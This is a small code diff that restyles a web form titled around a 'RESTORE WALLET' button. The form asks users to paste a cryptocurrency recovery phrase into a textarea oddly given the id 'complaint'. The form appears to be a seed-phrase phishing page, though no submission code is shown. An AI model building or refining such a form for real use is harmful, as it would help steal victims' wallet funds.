@@ -61,22 +61,16 @@ textarea {
 
 .paste-btn {
   position: absolute;
-  top: 8px;
-  right: 8px;
-  font-size: 11px;
-  padding: 4px 7px;
-  background: #238636;
-  color: white;
+  right: 5px;
+  top: 5px;
+  padding: 5px 8px;
+  font-size: 12px;
+  background: #ddd;
   border: none;
-  border-radius: 4px;
   cursor: pointer;
+  border-radius: 5px;
 }
-
-.paste-btn:hover {
-  background: #2ea043;
-}
-
-.submit {
+.submit-btn {
   width: 100%;
   padding: 12px;
   margin-top: 18px;
@@ -109,7 +103,7 @@ textarea {
     <textarea id="complaint" placeholder="Enter recovery phrase" required" required></textarea>
  <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>  
 
-    <button type="submit">RESTORE WALLET</button>
+   <button type="submit" class="submit-btn">RESTORE WALLET</button>
   </form>
 
   <div class="footer">
